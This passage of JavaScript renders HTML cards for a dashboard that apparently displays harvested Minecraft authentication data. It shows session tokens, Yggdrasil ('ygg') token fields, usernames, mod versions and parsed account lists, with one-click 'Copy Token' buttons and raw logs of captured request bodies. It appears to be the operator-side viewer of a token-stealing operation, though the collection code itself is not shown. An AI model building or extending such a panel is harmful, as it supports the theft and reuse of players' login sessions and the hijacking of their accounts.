        ${xrpFields.join("\n        ") || '<span class="field-val" style="color:#484f58;">No xrp-mc data</span>'}
      </div>
    </div>

    <div class="section">
      <div class="section-title">Minecraft Token (ygg) <button class="cpy" onclick="copyFromRaw(${idx},'ygg');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy ygg section">cpy</button></div>
      <div class="section-body">
        ${yggFields.join("\n        ") || '<span class="field-val" style="color:#484f58;">No ygg data</span>'}
      </div>
    </div>

  </div>`;
}

function renderSession(s, idx) {
  return `<div class="scard">
    <div class="scard-top">
      <span class="scard-path">${esc(s.url)}</span>
      <span class="scard-time">${s.time ? new Date(s.time).toLocaleString() : s.timestamp || "?"}</span>
    </div>
    <div class="scard-user">
      ${esc(s.username || "Unknown")}
      <button class="btn btn-sm" onclick="copySessionField(${idx},'username');this.textContent='ok';setTimeout(()=>this.textContent='Copy',1000)">Copy</button>
    </div>
    <div class="scard-info">
      ${s.modVersion ? `<div class="field-row"><span class="field-lbl">Mod:</span><span class="field-val">${esc(s.modVersion)}</span></div>` : ""}
      ${s.profileUrl ? `<div class="field-row"><span class="field-lbl">Profile:</span><span class="field-val"><a href="${esc(s.profileUrl)}" target="_blank">${esc(s.profileUrl)}</a></span></div>` : ""}
    </div>
    ${
      s.tokenRaw
        ? `<div class="scard-full">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
        <span style="color:#8b949e;font-size:0.78em;">Session Token</span>
        <button class="btn btn-sm" onclick="copySessionField(${idx},'tokenRaw');this.textContent='ok';setTimeout(()=>this.textContent='Copy Token',1000)">Copy Token</button>
      </div>
      <textarea readonly rows="2">${esc(s.tokenRaw)}</textarea>
    </div>`
        : ""
    }
  </div>`;
}

function renderEntry(e) {
  const id = "raw-" + Math.random().toString(36).slice(2, 8);
  const u = e.u || "";
  let extra = "";
  if (u.includes("/ess") && e._parsed?.accounts) {
    extra = `<div style="margin-top:6px;color:#3fb950;font-size:0.82em;">Parsed ${e._parsed.accounts.length} account(s): ${e._parsed.accounts.map((a) => a.name).join(", ")}</div>`;
  }
  if (e._parsed?.session) {
    extra = `<div style="margin-top:6px;color:#79c0ff;font-size:0.82em;">Session: ${esc(e._parsed.session.username)}</div>`;
  }
  return `<div class="entry" style="background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px 16px;margin-bottom:10px;">
    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px;">
      <span style="color:#8b949e;font-size:0.82em;">${new Date(e.t).toLocaleString()}</span>
      <span style="background:#1f6feb;color:#fff;padding:2px 8px;border-radius:10px;font-size:0.72em;">${e.m}</span>
      <span style="background:#21262d;padding:2px 10px;border-radius:10px;font-size:0.78em;color:#79c0ff;font-family:monospace;">${esc(u)}</span>
    </div>
    ${extra}
    <div class="raw-toggle" onclick="toggleRaw('${id}')">[Show/hide raw data]</div>
    <div class="raw-content" id="${id}"><pre>${esc(e.b || "(no body)")}</pre></div>
  </div>`;
}
